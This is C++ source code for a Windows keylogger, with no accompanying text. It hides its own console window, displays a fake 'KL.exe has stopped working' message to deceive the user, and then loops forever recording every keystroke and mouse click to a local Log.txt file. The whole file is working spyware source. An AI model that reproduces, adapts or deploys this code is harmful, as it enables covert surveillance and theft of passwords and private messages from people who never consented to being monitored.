#include<Windows.h>
#include<fstream>
#include<stdio.h>
#include<string>
using namespace std;

void Stealth()
{
    HWND hWnd;
    AllocConsole();
    hWnd = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(hWnd, 0);
}

void logkey(string key)
{
	ofstream out;
	out.open("Log.txt",ios::app);
	out<<key;
	out.close();
}

void logkey(char key)
{
	ofstream out;
	out.open("Log.txt",ios::app);
	out<<key;
	out.close();
}
void classify(char ch)
{
	switch(ch)
	{
		case VK_RETURN:logkey("\n");break;
		case VK_BACK:logkey("[BACK-SPACE]");break;
		case VK_SPACE:logkey(" ");break;
		case VK_SHIFT:logkey("[SHIFT]");break;
		case VK_LBUTTON:logkey("[LEFT-MOUSE]");break;
		case VK_RBUTTON:logkey("[RIGHT-MOUSE]");break;
		case VK_CONTROL:logkey("[CONTROL]");break;
		case VK_MENU:logkey("[ALT]");break;
		case VK_CAPITAL:logkey("[CAPS]");break;
		case VK_ESCAPE:logkey("[ESCAPE]");break;
		case VK_LEFT:logkey("[LEFT-ARROW]");break;
		case VK_UP:logkey("[UP-ARROW]");break;
		case VK_RIGHT:logkey("[RIGHT-ARROW]");break;
		case VK_DOWN:logkey("[DOWN-ARROW]");break;
		case VK_DELETE:logkey("[DEL]");break;
		default: logkey(ch);
	}
}

int main()
{
	Stealth();
	char ch;
	MessageBoxA(NULL,"KL.exe has stopped working","Alert!!",MB_ICONINFORMATION| MB_OK);
	while(1)
	{
		for(ch=8;ch<=255;ch++)
		{
			if(GetAsyncKeyState(ch)&(short)(0x0001))
			{
				classify(ch);
			}
		}
	}
}
